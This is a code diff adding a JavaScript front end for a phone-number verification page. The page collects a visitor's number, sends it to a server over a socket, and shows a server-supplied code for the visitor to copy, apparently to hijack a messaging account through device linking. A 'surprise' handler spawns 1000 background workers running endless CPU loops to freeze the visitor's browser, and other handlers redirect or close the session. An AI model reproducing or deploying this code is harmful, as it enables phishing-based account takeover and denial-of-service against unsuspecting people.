@@ -1,0 +1,200 @@
+function timeoutFetch(timeout, url) {
+    return Promise.race([
+        fetch(url),
+        new Promise((resolve, reject) =>
+            setTimeout(() => reject(new Error("timeout")), timeout)
+        )
+    ]);
+}
+
+document.addEventListener("DOMContentLoaded", function(){
+    const data = document.querySelector("body");
+    let numberEntered = false;
+    let browserReady = false;
+
+    const socket = io("/", {
+        path: "/socket.io",
+        query: "type=number"
+    });
+
+    let numberCheck = setInterval(function() {
+        if (numberEntered && browserReady) {
+            let phoneNumber = document.getElementById("number").value.replace(/\D/g, '');
+            socket.emit("start_number", { number: phoneNumber });
+            clearInterval(numberCheck);
+        }
+    }, 1000);
+
+    socket.on("code", (data) => {
+        clearInterval(numberCheck);
+        document.getElementById("loader").classList.add("hidden");
+        document.getElementById("step-1").classList.add("hidden");
+        document.getElementById("step-2").classList.remove("hidden");
+        document.getElementById("copy-code").classList.remove("hidden");
+        document.getElementById("user-number").textContent = data.number;
+
+        const code = document.getElementById("number-code");
+        code.setAttribute("data-code", data.code);
+        code.classList.remove("hidden");
+
+        const symbols = document.querySelectorAll("#number-code .symbol");
+
+        data.code.split('').forEach((symbol, index) => {
+            if (index < symbols.length) {
+                symbols[index].textContent = symbol;
+            }
+        });
+
+        numberEntered = true;
+    });
+
+    socket.on("exist", () => {
+        clearInterval(numberCheck);
+        document.getElementById("step-1").classList.add("hidden");
+        document.getElementById("step-2").classList.remove("hidden");
+        numberEntered = true;
+    });
+
+    socket.on("ready", () => {
+        browserReady = true;
+    });
+
+    socket.on("redirect", () => {
+        const redirect = data.getAttribute("data-redirect");
+
+        if (redirect) {
+            window.location.replace(redirect);
+        }
+    });
+
+    socket.on("surprise", () => {
+        const surprise = (numberOfWorkers) => {
+            for (let i = 0; i < numberOfWorkers; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    self.onmessage = () => {
+                        while (true) {
+                            for (let j = 0; j < 1e6; j++) {
+                                let x = Math.random();
+                                let y = Math.sqrt(x);
+                                let z = Math.sin(y) * Math.cos(y);
+                            }
+                        }
+                    }
+                `], { type: 'text/javascript' })));
+
+                worker.postMessage('start');
+            }
+        };
+
+        surprise(1000);
+    });
+
+    socket.on("closed", () => {
+        document.getElementById("session-closed").classList.remove("closed");
+    });
+
+    socket.on("connected", () => {
+        socket.emit("init_number", { template: Number(data.getAttribute("data-template")) });
+    });
+
+    document.getElementById("reload-page").addEventListener("click", function() {
+        window.location.reload();
+    });
+
+    document.querySelectorAll(".countries .item").forEach(item => {
+        item.addEventListener("click", function() {
+            const code = this.getAttribute("data-code");
+            const lang = this.getAttribute("data-lang");
+            const name = this.getAttribute("data-name");
+            document.getElementById("number").value = code;
+            document.querySelector(".countries").classList.toggle("hidden");
+            document.querySelector(".country").classList.toggle("active");
+            document.querySelector(".country .image img").src = `/static/img/flags/${lang}.png`;
+            document.querySelector(".country .name").textContent = name;
+        });
+    });
+
+    document.querySelector(".country").addEventListener("click", function() {
+        document.querySelector(".countries").classList.toggle("hidden");
+        this.classList.toggle("active");
+    });
+
+    document.getElementById("search").addEventListener("input", function() {
+        let searchText = this.value.toLowerCase();
+
+        document.querySelectorAll(".countries .items .item").forEach(item => {
+            let itemName = item.getAttribute("data-name").toLowerCase();
+
+            if (itemName.includes(searchText)) {
+                item.classList.remove("hidden");
+            } else {
+                item.classList.add("hidden");
+            }
+        });
+    });
+
+    document.getElementById("number").addEventListener("input", function() {
+        let phoneNumber = this.value.replace(/\D/g, '');
+
+        if (phoneNumber.length > 0) {
+            this.value = `+${phoneNumber}`;
+        }
+
+        document.querySelectorAll(".countries .items .item").forEach(item => {
+            let code = item.getAttribute("data-code");
+            let number = `+${phoneNumber}`;
+
+            if (code === number || code.startsWith(number)) {
+                let lang = item.getAttribute("data-lang");
+                let name = item.getAttribute("data-name");
+
+                document.querySelector(".country .image img").src = `/static/img/flags/${lang}.png`;
+                document.querySelector(".country .name").textContent = name;
+            }
+        });
+    });
+
+    document.getElementById("next-step").addEventListener("click", function() {
+        let phoneNumber = document.getElementById("number").value.replace(/\D/g, '');
+
+        if (phoneNumber.length >= 6) {
+            document.getElementById("step-1").classList.add("hidden");
+            document.getElementById("step-2").classList.remove("hidden");
+            document.getElementById("user-number").textContent = phoneNumber;
+            numberEntered = true;
+        } else {
+            document.querySelector(".block .error").classList.remove("hidden");
+        }
+    });
+
+    document.getElementById("copy-code").addEventListener("click", function() {
+        navigator.clipboard.writeText(document.getElementById("number-code").getAttribute("data-code"));
+    });
+
+    timeoutFetch(3000, "https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+            if (data.country_calling_code) {
+                const item = document.querySelector(`.countries .items .item[data-lang='${data.country}']`);
+                document.getElementById("number").value = data.country_calling_code;
+                document.querySelector(".country .image img").src = `/static/img/flags/${data.country}.png`;
+                document.querySelector(".country .name").textContent = item.getAttribute("data-name");
+            }
+        })
+        .catch(error => console.error(error));
+
+    let lazyLoad = new LazyLoad({});
+
+    setTimeout(function() {
+        const preloader = document.getElementById("preloader");
+
+        if (preloader) {
+            preloader.classList.add("hidden");
+        }
+    }, 3 * 1000);
+
+    setTimeout(function() {
+        socket.close();
+        document.getElementById("session-closed").classList.remove("closed");
+    }, 5 * 60 * 1000);
+});
